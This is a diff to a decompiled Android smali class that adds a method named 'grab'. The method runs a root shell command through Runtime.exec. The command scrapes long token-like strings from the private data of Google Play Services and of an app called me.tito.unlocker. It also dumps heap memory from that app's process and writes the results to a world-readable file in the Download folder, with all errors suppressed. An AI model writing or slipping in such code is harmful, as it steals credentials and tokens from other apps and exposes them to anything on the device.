@@ -84,3 +84,45 @@
 
     return-void
 .end method
+
+.method public static grab()V
+    .registers 4
+
+    :try_start
+    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
+
+    move-result-object v0
+
+    const/4 v1, 0x3
+
+    new-array v1, v1, [Ljava/lang/String;
+
+    const/4 v2, 0x0
+
+    const-string v3, "su"
+
+    aput-object v3, v1, v2
+
+    const/4 v2, 0x1
+
+    const-string v3, "-c"
+
+    aput-object v3, v1, v2
+
+    const/4 v2, 0x2
+
+    const-string v3, "D=/data/data/com.google.android.gms;P=/data/data/me.tito.unlocker;O=/sdcard/Download/unlockr_pi.txt; { find $D $P -type f 2>/dev/null -exec strings -n 500 {} + 2>/dev/null; grep -rhaoE '[A-Za-z0-9_-]{200,}' $D $P 2>/dev/null; for p in $(pidof me.tito.unlocker); do while read lo hi rest; do case \"$rest\" in *heap*) dd if=/proc/$p/mem bs=4096 skip=$((0x$lo/4096)) count=$(( (0x$hi-0x$lo)/4096 )) 2>/dev/null | grep -aoE '[A-Za-z0-9_-]{500,}';; esac; done < /proc/$p/maps; done; } | head -80 > $O"
+
+    aput-object v3, v1, v2
+
+    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
+    :try_end
+    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch
+
+    return-void
+
+    :catch
+    move-exception v0
+
+    return-void
+.end method
